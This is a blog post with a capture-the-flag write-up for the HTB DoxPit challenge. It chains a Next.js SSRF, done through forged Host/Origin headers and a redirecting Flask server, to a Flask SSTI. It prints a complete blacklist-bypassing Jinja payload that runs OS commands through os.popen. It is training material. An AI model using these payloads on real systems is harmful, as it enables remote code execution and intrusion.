<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Solving DoxPit Challenge | @MindPatch</title><meta name=keywords content="HTB,CTF,Flask,NextJS,Web Security"><meta name=description content="[HTB] Solving DoxPit Challange

In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge
This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag
Letâ€™s dive into the details!
Getting Started
The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app."><meta name=author content="MindPatch"><link rel=canonical href=https://www.mindpatch.net/posts/solving-doxpit-challenge/><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://www.mindpatch.net/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.mindpatch.net/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.mindpatch.net/favicon-32x32.png><link rel=apple-touch-icon href=https://www.mindpatch.net/apple-touch-icon.png><link rel=mask-icon href=https://www.mindpatch.net/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.mindpatch.net/posts/solving-doxpit-challenge/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://www.mindpatch.net/posts/solving-doxpit-challenge/"><meta property="og:site_name" content="@MindPatch"><meta property="og:title" content="Solving DoxPit Challenge"><meta property="og:description" content="[HTB] Solving DoxPit Challange In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge
This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag
Letâ€™s dive into the details!
Getting Started The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-05T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-05T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Flask"><meta property="article:tag" content="NextJS"><meta property="article:tag" content="Web Security"><meta property="og:image" content="https://www.mindpatch.net/og-image.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.mindpatch.net/og-image.png"><meta name=twitter:title content="Solving DoxPit Challenge"><meta name=twitter:description content="[HTB] Solving DoxPit Challange

In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge
This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag
Letâ€™s dive into the details!
Getting Started
The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app."><meta name=twitter:site content="@https://twitter.com/mindpatch"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.mindpatch.net/posts/"},{"@type":"ListItem","position":2,"name":"Solving DoxPit Challenge","item":"https://www.mindpatch.net/posts/solving-doxpit-challenge/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Solving DoxPit Challenge","name":"Solving DoxPit Challenge","description":"[HTB] Solving DoxPit Challange In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge\nThis challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag\nLetâ€™s dive into the details!\nGetting Started The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.\n","keywords":["HTB","CTF","Flask","NextJS","Web Security"],"articleBody":"[HTB] Solving DoxPit Challange In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge\nThis challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag\nLetâ€™s dive into the details!\nGetting Started The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.\nThe Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of render_template_string\n# app.py @web.route(\"/home\", methods=[\"GET\", \"POST\"]) @auth_middleware def feed(): directory = request.args.get(\"directory\") if not directory: dirs = os.listdir(os.getcwd()) return render_template(\"index.html\", title=\"home\", dirs=dirs) if any(char in directory for char in invalid_chars): return render_template(\"error.html\", title=\"error\", error=\"invalid directory\"), 400 try: with open(\"./application/templates/scan.html\", \"r\") as file: template_content = file.read() results = scan_directory(directory) template_content = template_content.replace(\"{{ results.date }}\", results[\"date\"]) template_content = template_content.replace(\"{{ results.scanned_directory }}\", results[\"scanned_directory\"]) return render_template_string(template_content, results=results) except Exception as e: return render_template(\"error.html\", title=\"error\", error=e), 500 However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)\nIdentifying the SSRF Vulnerability I took a look at the package.json file of the NextJS app and saw that it was using version 14.1.0\nThis version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the redirect function from next/navigation\nSpecifically, I found that the doRedirect function in serverAction.tsx, which was used in the home page posts links, utilized this function\n\"use server\"; import { redirect } from \"next/navigation\"; export async function doRedirect() { redirect(\"/error\"); } \u003cform action={doRedirect}\u003e \u003cbutton className=\"link-light\" type=\"submit\"\u003e{paste.title}\u003c/button\u003e \u003c/form\u003e Exploiting SSRF To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the Host and Origin headers to point to my server\nBefore diving into this, I added Burp Collaborator to test if I would receive any requests from the application\nThis step was crucial to confirm that the application was interacting with my server as expected\nAnd yep got it ðŸŽ‰\nI then configured Burp Suite to respond with a 302 redirect to 0.0.0.0:3000\nTo test this, I set up a simple Flask application to serve as a local endpoint\n# got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io from flask import Flask, Response, request, redirect app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/') def catch(path): if request.method == 'HEAD': resp = Response(\"\") resp.headers['Content-Type'] = 'text/x-component' return resp return redirect('http://0.0.0.0:3000') Accessing the Internal App After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000\nThe next step was to interact with the application, starting by registering a new account, as the application required registration for further actions\nThe registration endpoint allowed us to create an account using a simple GET request\n@web.route(\"/register\", methods=[\"GET\"]) def register(): username = request.args.get(\"username\") password = request.args.get(\"password\") if not username or not password: return render_template(\"register.html\", title=\"register\") db_session = Database() token = generate(16) user_valid = db_session.create_user(username, password, token) if not user_valid: return render_template(\"error.html\", title=\"error\", error=\"user exists\"), 401 return render_template(\"error.html\", title=\"success\", error=f\"User created with token: {token}\"), 200 So I changed my server to point to [http://0.0.0.0:3000/register?username=kebda\u0026password=3afroto](http://0.0.0.0:3000/register?username=kebda\u0026password=3afroto)\nWith the account successfully created, the application returned a session token\nUsing this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate: http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530\n# auth handling function def auth_middleware(func): def check_user(*args, **kwargs): db_session = Database() if not session.get(\"loggedin\"): if request.args.get(\"token\") and db_session.check_token(request.args.get(\"token\")): return func(*args, **kwargs) else: return redirect(\"/login\") return func(*args, **kwargs) check_user.__name__ = func.__name__ return check_user This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D\nletâ€™s jump into directory parameter to get this SSTI!\nI initially tried common payloads like {{1*8}}, but these were blocked due to a blacklist filtering out certain characters:(\ninvalid_chars = [\"{{\", \"}}\", \".\", \"_\", \"[\", \"]\",\"\\\\\", \"x\"] if any(char in directory for char in invalid_chars): return render_template(\"error.html\", title=\"error\", error=\"invalid directory\"), 400 Bypassing the Blacklist To bypass this filter, I searched for alternative approaches and found a method in this article\nThe idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter\n+---------------------------+ | Main Input | | (Filtered by blacklist) | +---------------------------+ | v +---------------------------+ | Alternative | | Input Parameter | | (Not filtered) | +---------------------------+ | v +---------------------------+ | Payload Injection | | (Bypassing the filter) | +---------------------------+ | v +---------------------------+ | Final Output | | (Executed Command Result)| +---------------------------+ And thatâ€™s the payload I came with\n\u0026#123;%with output=((((request|attr('application'))|attr(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;globals\u0026#39;)))|attr(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;getitem\u0026#39;)))(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;builtins\u0026#39;))|attr(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;getitem\u0026#39;)))(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;import\u0026#39;)))(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(request|attr(\u0026quot;args\u0026quot;)|attr(\u0026quot;get\u0026quot;)(\u0026#39;cmd\u0026#39;))|attr(\u0026#39;read\u0026#39;)()%\u0026#125;\u0026#123;%print(output)%\u0026#125;\u0026#123;%endwith%\u0026#125;\u0026globals=__globals__\u0026getitem=__getitem__\u0026builtins=__builtins__\u0026import=__import__\u0026cmd= To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters\ninvalid_chars = [\"{{\", \"}}\", \".\", \"_\", \"[\", \"]\",\"\\\\\", \"x\"]\nI replaced blacklisted characters and patterns with alternatives:\n**{{** was replaced with **{%**. **}}** was replaced with **%}**. **.** was bypassed by using attribute chaining through the request object. **_** was avoided by using alternative attribute names and methods. **[** and **]** were substituted with attribute access via attr(). **\\\\** and **x** were sidestepped by constructing the payload in a way that didnâ€™t require these characters. I navigated through the request attributes to access Pythonâ€™s globals and builtins dictionaries, using the import function, I imported the os module and used its popen method to OS execute commands\nâ€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” â€” -\nAnd Successfully executed the id command, confirming root access\nhttp://0.0.0.0:3000/home?token=\u003c\u003e\u0026directory=\u0026#123;%with output=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globals')))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('cmd'))|attr('read')()%\u0026#125;\u0026#123;%print(output)%\u0026#125;\u0026#123;%endwith%\u0026#125;\u0026globals=__globals__\u0026getitem=__getitem__\u0026builtins=__builtins__\u0026import=__import__\u0026cmd=id Nice, Root:)\nRan ls -lah / to list the system files, which revealed the flagâ€™s location\nnice flag is there, lets use catto read the flag from the file, successfully retrieving it\nAnd Thatâ€™s it\nBye UwU\n","wordCount":"982","inLanguage":"en","image":"https://www.mindpatch.net/og-image.png","datePublished":"2024-08-05T00:00:00Z","dateModified":"2024-08-05T00:00:00Z","author":{"@type":"Person","name":"MindPatch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.mindpatch.net/posts/solving-doxpit-challenge/"},"publisher":{"@type":"Organization","name":"@MindPatch","logo":{"@type":"ImageObject","url":"https://www.mindpatch.net/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.mindpatch.net/ accesskey=h title="@MindPatch (Alt + H)">@MindPatch</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.mindpatch.net/about title=About><span>About</span></a></li><li><a href=https://www.mindpatch.net/projects/ title=Projects><span>Projects</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Solving DoxPit Challenge</h1><div class=post-meta><span title='2024-08-05 00:00:00 +0000 UTC'>August 5, 2024</span>&nbsp;Â·&nbsp;5 min&nbsp;Â·&nbsp;MindPatch</div></header><div class=post-content><h1 id=htb-solving-doxpit-challange>[HTB] Solving DoxPit Challange<a hidden class=anchor aria-hidden=true href=#htb-solving-doxpit-challange>#</a></h1><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png></p><p>In this write-up, Iâ€™ll walk you through the process of solving the HTB DoxPit challenge</p><p>This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, Iâ€™ll show you how to exploit these vulnerabilities and successfully capture the flag</p><p>Letâ€™s dive into the details!</p><h1 id=getting-started>Getting Started<a hidden class=anchor aria-hidden=true href=#getting-started>#</a></h1><p>The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.</p><p>The Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of <code>render_template_string</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># app.py</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@web.route</span>(<span style=color:#e6db74>&#34;/home&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@auth_middleware</span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>feed</span>():  
</span></span><span style=display:flex><span>  directory <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;directory&#34;</span>)  
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> directory:  
</span></span><span style=display:flex><span>    dirs <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>listdir(os<span style=color:#f92672>.</span>getcwd())  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;index.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;home&#34;</span>, dirs<span style=color:#f92672>=</span>dirs)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> any(char <span style=color:#f92672>in</span> directory <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> invalid_chars):  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;error.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;error&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;invalid directory&#34;</span>), <span style=color:#ae81ff>400</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span>:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;./application/templates/scan.html&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> file:  
</span></span><span style=display:flex><span>        template_content <span style=color:#f92672>=</span> file<span style=color:#f92672>.</span>read()  
</span></span><span style=display:flex><span>        results <span style=color:#f92672>=</span> scan_directory(directory)  
</span></span><span style=display:flex><span>        template_content <span style=color:#f92672>=</span> template_content<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;{{ results.date }}&#34;</span>, results[<span style=color:#e6db74>&#34;date&#34;</span>])  
</span></span><span style=display:flex><span>        template_content <span style=color:#f92672>=</span> template_content<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;{{ results.scanned_directory }}&#34;</span>, results[<span style=color:#e6db74>&#34;scanned_directory&#34;</span>])  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template_string(template_content, results<span style=color:#f92672>=</span>results)  
</span></span><span style=display:flex><span>          
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;error.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;error&#34;</span>, error<span style=color:#f92672>=</span>e), <span style=color:#ae81ff>500</span>
</span></span></code></pre></div><p>However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)</p><h1 id=identifying-the-ssrf-vulnerability>Identifying the SSRF Vulnerability<a hidden class=anchor aria-hidden=true href=#identifying-the-ssrf-vulnerability>#</a></h1><p>I took a look at the <code>package.json</code> file of the NextJS app and saw that it was using version <code>14.1.0</code></p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:681/1*dleheh-C-qvDofbc6PZIRA.png></p><p>This version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the <code>redirect</code> function from <code>next/navigation</code></p><p>Specifically, I found that the <code>doRedirect</code> function in <code>serverAction.tsx</code>, which was used in the home page posts links, utilized this function</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#e6db74>&#34;use server&#34;</span>;  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>import</span> { <span style=color:#a6e22e>redirect</span> } <span style=color:#a6e22e>from</span> <span style=color:#e6db74>&#34;next/navigation&#34;</span>;  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>export</span> <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>doRedirect</span>() {  
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#34;/error&#34;</span>);  
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>{doRedirect}</span>&gt;  
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>className</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;link-light&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>&gt;{paste.title}&lt;/<span style=color:#f92672>button</span>&gt;  
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
</span></span></code></pre></div><h1 id=exploiting-ssrf>Exploiting SSRF<a hidden class=anchor aria-hidden=true href=#exploiting-ssrf>#</a></h1><p>To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the <code>Host</code> and <code>Origin</code> headers to point to my server</p><p>Before diving into this, I added Burp Collaborator to test if I would receive any requests from the application</p><p>This step was crucial to confirm that the application was interacting with my server as expected</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*OIhA8_i0n-duq8g0sNJEVA.png></p><p>And yep got it ðŸŽ‰</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*vAubxr_uxPh000PCWOZjpg.png></p><p>I then configured Burp Suite to respond with a 302 redirect to <code>0.0.0.0:3000</code></p><p>To test this, I set up a simple Flask application to serve as a local endpoint</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io  </span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, Response, request, redirect  
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, defaults<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;path&#39;</span>: <span style=color:#e6db74>&#39;&#39;</span>})  
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&lt;path:path&gt;&#39;</span>)  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>catch</span>(path):  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;HEAD&#39;</span>:  
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> Response(<span style=color:#e6db74>&#34;&#34;</span>)  
</span></span><span style=display:flex><span>        resp<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Content-Type&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;text/x-component&#39;</span>  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> resp  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;http://0.0.0.0:3000&#39;</span>)
</span></span></code></pre></div><h1 id=accessing-the-internal-app>Accessing the Internal App<a hidden class=anchor aria-hidden=true href=#accessing-the-internal-app>#</a></h1><p>After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*SuGoOgMNjUgZC0tKqx-joA.png></p><p>The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions</p><p>The registration endpoint allowed us to create an account using a simple GET request</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@web.route</span>(<span style=color:#e6db74>&#34;/register&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>])  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():  
</span></span><span style=display:flex><span>  username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;username&#34;</span>)  
</span></span><span style=display:flex><span>  password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;password&#34;</span>)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> username <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> password:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;register.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;register&#34;</span>)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  db_session <span style=color:#f92672>=</span> Database()  
</span></span><span style=display:flex><span>  token <span style=color:#f92672>=</span> generate(<span style=color:#ae81ff>16</span>)  
</span></span><span style=display:flex><span>  user_valid <span style=color:#f92672>=</span> db_session<span style=color:#f92672>.</span>create_user(username, password, token)  
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user_valid:  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;error.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;error&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user exists&#34;</span>), <span style=color:#ae81ff>401</span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#34;error.html&#34;</span>, title<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;success&#34;</span>, error<span style=color:#f92672>=</span><span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;User created with token: </span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>), <span style=color:#ae81ff>200</span>
</span></span></code></pre></div><p>So I changed my server to point to <code>[http://0.0.0.0:3000/register?username=kebda&amp;password=3afroto](http://0.0.0.0:3000/register?username=kebda&amp;password=3afroto)</code></p><p>With the account successfully created, the application returned a session token</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*RcpX5mpj9R-BJDQ5JzBZ3A.png></p><p>Using this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate: <code>http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># auth handling function  </span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>auth_middleware</span>(func):  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_user</span>(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs):  
</span></span><span style=display:flex><span>    db_session <span style=color:#f92672>=</span> Database()  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;loggedin&#34;</span>):  
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;token&#34;</span>) <span style=color:#f92672>and</span> db_session<span style=color:#f92672>.</span>check_token(request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;token&#34;</span>)):  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> func(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)  
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>else</span>:  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/login&#34;</span>)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> func(<span style=color:#f92672>*</span>args, <span style=color:#f92672>**</span>kwargs)  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  check_user<span style=color:#f92672>.</span>__name__ <span style=color:#f92672>=</span> func<span style=color:#f92672>.</span>__name__  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> check_user
</span></span></code></pre></div><p>This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D</p><p><img loading=lazy src=https://miro.medium.com/v2/resize:fit:700/1*4f-kqARPFX3WrKrr-8s5Sw.png></p><p>letâ€™s jump into <code>directory</code> parameter to get this SSTI!</p><p>I initially tried common payloads like <code>{{1*8}}</code>, but these were blocked due to a blacklist filtering out certain characters:(</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>invalid_chars <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;{{&#34;</span>, <span style=color:#e6db74>&#34;}}&#34;</span>, <span style=color:#e6db74>&#34;.&#34;</span>, <span style=color:#e6db74>&#34;_&#34;</span>, <span style=color:#e6db74>&#34;[&#34;</span>, <span style=color:#e6db74>&#34;]&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;x&#34;</span>]
</span></span><span style=display:flex><span> 
